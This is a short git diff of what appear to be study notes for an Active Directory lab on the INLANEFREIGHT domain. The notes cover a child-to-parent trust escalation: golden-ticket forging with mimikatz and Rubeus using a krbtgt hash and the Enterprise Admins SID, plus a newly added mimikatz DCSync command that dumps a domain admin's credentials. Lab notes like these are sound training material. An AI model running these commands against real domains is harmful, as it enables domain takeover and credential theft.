@@ -457,12 +457,12 @@ Get-DomainSID #run from within/from the child domain
 Convert-NameToSid target.domain.com\krbtgt
 ```
 
-3. TARGET USER
+**3.TARGET USER**
 
 ```
 hacker 
 ```
-4. CHILD-DOMAIN Name
+**4. CHILD-DOMAIN Name**
 - already known 
 5. SID for Enterprise Admins
   
@@ -479,6 +479,12 @@ kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:CHILD-D
 
 ```
 .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+```
+>[!IMPORTANT]
+> When target domain is not the same as user's domain, we will need specific exact domain to perform the DCSync operation on the particular domain controller
+
+```
+lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
 
   
